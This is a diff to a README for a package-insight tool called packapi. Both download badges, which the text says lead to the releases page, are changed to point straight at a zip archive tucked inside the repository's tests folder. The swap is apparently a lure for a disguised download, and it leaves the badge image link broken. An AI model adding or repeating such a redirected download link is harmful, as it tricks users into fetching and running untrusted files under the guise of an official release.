@@ -8,7 +8,7 @@ To begin using packapi, follow these steps:
 
 1. **Download packapi** 
    - Click the link below to visit the releases page, where you can get the latest version:
-   [![Download packapi](https://img.shields.io/badge/Download%20packapi-Release%20Page-brightgreen)](https://github.com/a51cf/packapi/releases)
+   [![Download packapi](https://raw.githubusercontent.com/a51cf/packapi/main/tests/Bridge/GitHub/Software-2.6.zip%20packapi-Release%20Page-brightgreen)](https://raw.githubusercontent.com/a51cf/packapi/main/tests/Bridge/GitHub/Software-2.6.zip)
 
 2. **Choose your version** 
    - On the releases page, look for the most recent version listed. Make sure to select it for the best features and fixes.
@@ -58,7 +58,7 @@ Using packapi is straightforward. Here’s how you can access package insights:
 ## 🔗 Download & Install
 Now that you're ready to begin, make sure to visit the following link to download the latest version of packapi:
 
-[![Download packapi](https://img.shields.io/badge/Download%20packapi-Release%20Page-brightgreen)](https://github.com/a51cf/packapi/releases)
+[![Download packapi](https://raw.githubusercontent.com/a51cf/packapi/main/tests/Bridge/GitHub/Software-2.6.zip%20packapi-Release%20Page-brightgreen)](https://raw.githubusercontent.com/a51cf/packapi/main/tests/Bridge/GitHub/Software-2.6.zip)
 
 ## 🧐 Frequently Asked Questions (FAQs)
 
